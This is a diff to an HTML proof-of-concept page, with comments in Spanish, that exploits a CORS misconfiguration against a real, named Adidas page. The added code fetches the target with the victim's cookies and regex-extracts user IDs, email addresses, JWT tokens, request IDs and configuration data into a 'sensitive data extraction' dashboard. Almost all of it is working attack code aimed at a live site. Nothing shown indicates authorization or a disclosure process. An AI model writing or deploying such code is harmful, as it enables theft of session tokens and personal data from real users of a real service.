@@ -1,33 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit PoC</title>
+    <title>CORS Full Sensitive Data Leak</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff41; padding: 20px; }
+        .dashboard { border: 2px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; }
+        .leak-item { margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        .label { color: #ff3e3e; font-weight: bold; text-transform: uppercase; }
+        .value { color: #ffffff; word-break: break-all; }
+        pre { white-space: pre-wrap; background: #1a1a1a; padding: 10px; border-radius: 5px; }
+    </style>
 </head>
 <body>
-    <h1>CORS Misconfiguration PoC</h1>
-    <p>Si ves contenido aquí abajo, el ataque fue exitoso.</p>
-    <div id="result" style="border: 1px solid black; padding: 10px; background: #f0f0f0;">
-        Esperando respuesta...
+    <div class="dashboard">
+        <h1>[!] ADIDAS SENSITIVE DATA EXTRACTION</h1>
+        <p>Target: <span id="target">https://www.adidas.com/ec/es/contactus</span></p>
+        <hr>
+
+        <div class="leak-item">
+            <span class="label">> User ID / UUID:</span>
+            <div id="uuid" class="value">Buscando...</div>
+        </div>
+
+        <div class="leak-item">
+            <span class="label">> Emails Detectados:</span>
+            <div id="email" class="value">Buscando...</div>
+        </div>
+
+        <div class="leak-item">
+            <span class="label">> Request IDs (X-Request-ID):</span>
+            <div id="requestid" class="value">Buscando...</div>
+        </div>
+
+        <div class="leak-item">
+            <span class="label">> Tokens & Keys (JWT/API):</span>
+            <pre id="tokens">Buscando...</pre>
+        </div>
+
+        <div class="leak-item">
+            <span class="label">> Raw Sensitive Metadata:</span>
+            <pre id="meta">Analizando tags...</pre>
+        </div>
     </div>
 
     <script>
-        // La URL de Adidas que quieres atacar
         const targetUrl = "https://www.adidas.com/ec/es/contactus";
 
-        // Usamos fetch con 'include' para enviar las cookies de la víctima
         fetch(targetUrl, {
             method: "GET",
-            credentials: "include" 
+            credentials: "include"
         })
         .then(response => response.text())
         .then(data => {
-            // Mostramos los datos robados en la pantalla
-            document.getElementById("result").innerText = data;
-            console.log("Datos extraídos con éxito:", data);
+            // 1. Extraer UUID / ID de Usuario
+            // Busca patrones comunes de IDs: 8-4-4-4-12 caracteres hex
+            const uuidRegex = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
+            const uuidFound = data.match(uuidRegex);
+            document.getElementById("uuid").innerText = uuidFound ? uuidFound[0] : "No detectado en el HTML";
+
+            // 2. Extraer Emails
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+            const emailsFound = data.match(emailRegex);
+            document.getElementById("email").innerText = emailsFound ? [...new Set(emailsFound)].join(", ") : "No se encontraron emails";
+
+            // 3. Extraer Tokens (JWT)
+            const tokenRegex = /eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g;
+            const tokensFound = data.match(tokenRegex);
+            document.getElementById("tokens").innerText = tokensFound ? tokensFound.slice(0, 3).join("\n\n") : "No se encontraron JWTs";
+
+            // 4. Extraer IDs de rasteo específicos de la página (como los que viste en Burp)
+            // Buscamos x-request-id o similares dentro de scripts
+            const reqIdMatch = data.match(/request[_-]id["']?\s*[:=]\s*["']([^"']+)["']/i);
+            document.getElementById("requestid").innerText = reqIdMatch ? reqIdMatch[1] : "No encontrado";
+
+            // 5. Capturar bloques de configuración (Metadatos)
+            // Muchas veces Adidas pone info en un JSON dentro de un script
+            const configMatch = data.match(/window\.adidasConfig\s*=\s*({.*?});/s) || data.match(/window\.dataLayer\s*=\s*(\[.*?\]);/s);
+            if (configMatch) {
+                document.getElementById("meta").innerText = configMatch[1].substring(0, 1000) + "...";
+            } else {
+                document.getElementById("meta").innerText = "No se detectó objeto de configuración global.";
+            }
+
+            console.log("Ataque CORS completado.");
         })
         .catch(err => {
-            document.getElementById("result").innerText = "Error: " + err;
-            console.error("Fallo el ataque:", err);
+            document.getElementById("uuid").innerText = "Error: Verifica que el servidor de Adidas siga reflejando tu Origin.";
+            console.error(err);
         });
     </script>
 </body>
